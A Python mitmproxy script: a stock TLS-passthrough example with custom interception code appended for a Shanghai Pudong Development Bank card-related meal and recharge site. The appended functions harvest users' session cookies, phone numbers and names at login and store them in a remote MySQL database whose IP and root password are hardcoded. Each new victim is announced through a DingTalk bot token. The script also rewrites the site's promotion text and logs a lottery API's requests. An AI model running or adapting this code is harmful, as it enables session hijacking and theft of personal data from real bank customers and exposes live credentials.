# !bin/usr/env python3

import re
import pymysql
import requests


"""
This inline script allows conditional TLS Interception based
on a user-defined strategy.
Example:
    > mitmdump -s tls_passthrough.py
    1. curl --proxy http://localhost:8080 https://example.com --insecure
    // works - we'll also see the contents in mitmproxy
    2. curl --proxy http://localhost:8080 https://example.com --insecure
    // still works - we'll also see the contents in mitmproxy
    3. curl --proxy http://localhost:8080 https://example.com
    // fails with a certificate error, which we will also see in mitmproxy
    4. curl --proxy http://localhost:8080 https://example.com
    // works again, but mitmproxy does not intercept and we do *not* see the contents
Authors: Maximilian Hils, Matthew Tuusberg
"""
import collections
import random
import json

from enum import Enum

import mitmproxy
from mitmproxy import ctx
from mitmproxy.exceptions import TlsProtocolException
from mitmproxy.proxy.protocol import TlsLayer, RawTCPLayer


class InterceptionResult(Enum):
    success = True
    failure = False
    skipped = None


class _TlsStrategy:
    """
    Abstract base class for interception strategies.
    """

    def __init__(self):
        # A server_address -> interception results mapping
        self.history = collections.defaultdict(lambda: collections.deque(maxlen=200))

    def should_intercept(self, server_address):
        """
        Returns:
            True, if we should attempt to intercept the connection.
            False, if we want to employ pass-through instead.
        """
        raise NotImplementedError()

    def record_success(self, server_address):
        self.history[server_address].append(InterceptionResult.success)

    def record_failure(self, server_address):
        self.history[server_address].append(InterceptionResult.failure)

    def record_skipped(self, server_address):
        self.history[server_address].append(InterceptionResult.skipped)


class ConservativeStrategy(_TlsStrategy):
    """
    Conservative Interception Strategy - only intercept if there haven't been any failed attempts
    in the history.
    """

    def should_intercept(self, server_address):
        if InterceptionResult.failure in self.history[server_address]:
            return False
        return True


class ProbabilisticStrategy(_TlsStrategy):
    """
    Fixed probability that we intercept a given connection.
    """

    def __init__(self, p):
        self.p = p
        super(ProbabilisticStrategy, self).__init__()

    def should_intercept(self, server_address):
        return random.uniform(0, 1) < self.p


class TlsFeedback(TlsLayer):
    """
    Monkey-patch _establish_tls_with_client to get feedback if TLS could be established
    successfully on the client connection (which may fail due to cert pinning).
    """

    def _establish_tls_with_client(self):
        server_address = self.server_conn.address

        try:
            super(TlsFeedback, self)._establish_tls_with_client()
        except TlsProtocolException as e:
            tls_strategy.record_failure(server_address)
            raise e
        else:
            tls_strategy.record_success(server_address)


# inline script hooks below.

tls_strategy = None


def load(l):
    l.add_option(
        "tlsstrat", int, 0, "TLS passthrough strategy (0-100)",
    )


def configure(updated):
    global tls_strategy
    if ctx.options.tlsstrat > 0:
        tls_strategy = ProbabilisticStrategy(float(ctx.options.tlsstrat) / 100.0)
    else:
        tls_strategy = ConservativeStrategy()


def next_layer(next_layer):
    """
    This hook does the actual magic - if the next layer is planned to be a TLS layer,
    we check if we want to enter pass-through mode instead.
    """
    if isinstance(next_layer, TlsLayer) and next_layer._client_tls:
        server_address = next_layer.server_conn.address

        if tls_strategy.should_intercept(server_address):
            # We try to intercept.
            # Monkey-Patch the layer to get feedback from the TLSLayer if interception worked.
            next_layer.__class__ = TlsFeedback
        else:
            # We don't intercept - reply with a pass-through layer and add a "skipped" entry.
            mitmproxy.ctx.log("TLS passthrough for %s" % repr(next_layer.server_conn.address), "info")
            next_layer_replacement = RawTCPLayer(next_layer.ctx, ignore=True)
            next_layer.reply.send(next_layer_replacement)
            tls_strategy.record_skipped(server_address)

def insert(phonenumber,name,phpsessid,serverid):
    conn = pymysql.connect("47.102.119.82","root","SUN5201314xiang!","pufa" )
    cur=conn.cursor()
    sql ="INSERT INTO pufainfo ( phone_number, user_name,phpsessid,serverid,enabled) VALUES (%s,%s,%s,%s,'N')"
    cur.execute(sql,(phonenumber,name,phpsessid,serverid))
    conn.commit()
    conn.close()

def queryByphone(phonenumber):
    conn = pymysql.connect("47.102.119.82","root","SUN5201314xiang!","pufa" )
    cur=conn.cursor()
    sql = "select * from pufainfo where phone_number = %s"
    resultNumber=cur.execute(sql,(phonenumber)) #执行sql语句，返回sql查询成功的记录数目
    cur.close()
    conn.close()
    if resultNumber:
        return True    #存在数据
    else:
        return False   #不存在数据

def updateDB(phonenumber,phpsessid,serverid):
    conn = pymysql.connect("47.102.119.82","root","SUN5201314xiang!","pufa" )
    cur=conn.cursor()
    sql = "update pufainfo set phpsessid=%s,serverid=%s where phone_number = %s"
    cur.execute(sql,(phpsessid,serverid,phonenumber))
    conn.commit()
    cur.close()
    conn.close()

def getnew(phone,name):
    new= str('有新用户加入：'+phone+' '+ name)
    urldok = 'https://oapi.dingtalk.com/robot/send?access_token=cd69618c96ef3d6c65e48a33752aed238be889fac4b9fbdfb31db6ebeec915b2'
    pagremok = {
                                     "msgtype": "text",
                                     "text": {
                                     "content": new}}
    headersok = {
                                     'Content-Type': 'application/json'}
    requests.post(urldok, data=json.dumps(pagremok), headers=headersok)
    

def request(flow):  
    print(flow.request.url)
    if 'https://lotteryapi.100qu.net/lottery/execute' in flow.request.url:
        print(flow.request.contents)



def response(flow: mitmproxy.http.HTTPFlow):
    print(flow.response.text)

    if 'https://meal.spdbccc.toptastewin.com/chongzhi/api/goods/act_info' in flow.request.url:
        flow.response.text=re.sub(r'活动对象：浦大喜奔APP注册用户（以下简称“用户”）', '可以抓',flow.response.text )
    if 'https://meal.spdbccc.toptastewin.com/chongzhi/api/login/toLogin' in flow.request.url:
        cookies=dict(flow.request.cookies)
        res = json.loads(flow.response.text)
        serverid = 'SERVERID='+cookies['SERVERID'][0:33]
        phpsessid = 'PHPSESSID='+cookies['PHPSESSID']
        phone=res['message']['phone']
        name = res['message']['name']
        if queryByphone(phone):
            print('已经存在数据开始更新')
            updateDB(phone,phpsessid,serverid)

        else:
            print('数据库里面不存在开始插入')
            insert(phone,name,phpsessid,serverid)
            getnew(phone,name)



